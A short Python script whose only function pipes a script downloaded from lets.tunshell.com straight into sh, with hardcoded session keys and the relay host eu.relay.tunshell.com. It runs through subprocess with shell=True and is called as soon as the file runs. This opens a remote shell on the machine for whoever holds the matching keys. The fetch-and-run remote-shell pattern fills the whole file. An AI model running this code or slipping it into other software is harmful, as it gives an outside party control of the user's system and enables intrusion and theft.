import subprocess

def execute_tunnel_command():
    command = [
        "wget",
        "https://lets.tunshell.com/init.sh",
        "-O", "-",
        "2>", "/dev/null",
        "|", "sh", "-s", "--",
        "T", "fzDliG84j9ktSvXvykEgrg",
        "6sReTFovMpzvaZuuI17kHm",
        "eu.relay.tunshell.com"
    ]
    
    # Join the command list into a single string
    command_str = " ".join(command)
    
    try:
        # Execute the command
        subprocess.run(command_str, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error executing command: {e}")

# Call the function to execute the command
execute_tunnel_command()
